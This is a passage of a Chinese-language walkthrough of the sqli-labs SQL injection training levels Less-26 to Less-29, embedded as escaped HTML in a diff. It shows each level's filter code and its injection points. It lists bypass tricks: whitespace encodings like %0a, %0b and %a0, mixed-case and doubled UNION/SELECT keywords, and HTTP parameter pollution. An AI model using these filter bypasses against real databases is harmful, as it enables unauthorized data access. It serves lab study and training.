+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[--]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;		&lt;span class=&#34;c1&#34;&gt;//Strip out --
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[#]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;			&lt;span class=&#34;c1&#34;&gt;//Strip out #
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[\s]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;		&lt;span class=&#34;c1&#34;&gt;//Strip out spaces
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[\/\\\\]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;//Strip out slashes
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;单引号&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;绕过-1&#34;&gt;绕过&lt;/h3&gt;
+&lt;p&gt;针对空白符，可用如下方式替换绕过，本次使用/\s/匹配，所以用%0b和%a0才可绕过&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;符号&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;%09&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;TAB 键(水平)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;%0a&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;新建一行&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;%0c&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;新的一页&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;%0d&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;return 功能&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;%0b&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;TAB 键(垂直)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;%a0&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;空格&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;less-26a&#34;&gt;Less-26a&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;单引号+单括号&lt;/td&gt;
+&lt;td&gt;UNION、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;与Less-26一致，拼接方式不同，不能报错&lt;/p&gt;
+&lt;h2 id=&#34;less-27&#34;&gt;Less-27&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[\/\*]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;		&lt;span class=&#34;c1&#34;&gt;//strip out /*
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[--]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;		&lt;span class=&#34;c1&#34;&gt;//Strip out --.
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[#]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;			&lt;span class=&#34;c1&#34;&gt;//Strip out #.
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[ +]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    &lt;span class=&#34;c1&#34;&gt;//Strip out spaces.
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/select/m&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    &lt;span class=&#34;c1&#34;&gt;//Strip out spaces.
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[ +]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    &lt;span class=&#34;c1&#34;&gt;//Strip out spaces.
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/union/s&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    &lt;span class=&#34;c1&#34;&gt;//Strip out union
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/select/s&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    &lt;span class=&#34;c1&#34;&gt;//Strip out select
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/UNION/s&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    &lt;span class=&#34;c1&#34;&gt;//Strip out UNION
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/SELECT/s&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    &lt;span class=&#34;c1&#34;&gt;//Strip out SELECT
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/Union/s&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    &lt;span class=&#34;c1&#34;&gt;//Strip out Union
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/Select/s&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    &lt;span class=&#34;c1&#34;&gt;//Strip out select
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;单引号&lt;/td&gt;
+&lt;td&gt;UNION、显错、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id=&#34;绕过-2&#34;&gt;绕过&lt;/h3&gt;
+&lt;p&gt;本次只是简单过滤了空格，而不是空白符，所以%0a即可绕过空格限制&lt;/p&gt;
+&lt;p&gt;unioN&lt;/p&gt;
+&lt;p&gt;unIon&lt;/p&gt;
+&lt;p&gt;seLEct&lt;/p&gt;
+&lt;p&gt;等等&lt;/p&gt;
+&lt;h2 id=&#34;less-27a&#34;&gt;Less-27a&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;双引号&lt;/td&gt;
+&lt;td&gt;UNION、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;与Less-27一致，没有显错&lt;/p&gt;
+&lt;h2 id=&#34;less-28&#34;&gt;Less-28&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[\/\*]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;				&lt;span class=&#34;c1&#34;&gt;//strip out /*
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[--]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;				&lt;span class=&#34;c1&#34;&gt;//Strip out --.
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[#]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;					&lt;span class=&#34;c1&#34;&gt;//Strip out #.
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[ +]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    		&lt;span class=&#34;c1&#34;&gt;//Strip out spaces.
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/[ +]/&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    		&lt;span class=&#34;c1&#34;&gt;//Strip out spaces.
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/union\s+select/i&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	    &lt;span class=&#34;c1&#34;&gt;//Strip out UNION &amp;amp; SELECT.
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;单引号+单括号&lt;/td&gt;
+&lt;td&gt;UNION、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;过滤了&lt;code&gt;union空白符select&lt;/code&gt;，可双写绕过，可替换空白符为%0b或%a0绕过&lt;/p&gt;
+&lt;h2 id=&#34;less-28a&#34;&gt;Less-28a&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;拼接点&lt;/th&gt;
+&lt;th&gt;可用注入类型&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;单引号+单括号&lt;/td&gt;
+&lt;td&gt;UNION、bool盲、延时盲&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;少了几个过滤规则，其余和Less-28一致&lt;/p&gt;
+&lt;h2 id=&#34;less-29&#34;&gt;Less-29&lt;/h2&gt;
+&lt;p&gt;index.php // 可以不用管，作者误放了应该&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;普通可注入页面
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;login.php&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$qs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;QUERY_STRING&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;$id1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;java_implimentation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$qs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;whitelist&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$id1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+
+&lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SELECT * FROM users WHERE id=&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$id&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39; LIMIT 0,1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;whitelist&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+	&lt;span class=&#34;c1&#34;&gt;# 匹配数字
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;nv&#34;&gt;$match&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/^\d+$/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$input&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; 
+	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;不是数字：&lt;/span&gt;
+		&lt;span class=&#34;nx&#34;&gt;重定向到失败页面&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+
+
+&lt;span class=&#34;c1&#34;&gt;# HTTP 参数污染
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;java_implimentation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$query_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+	&lt;span class=&#34;nv&#34;&gt;$q_s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$query_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+	
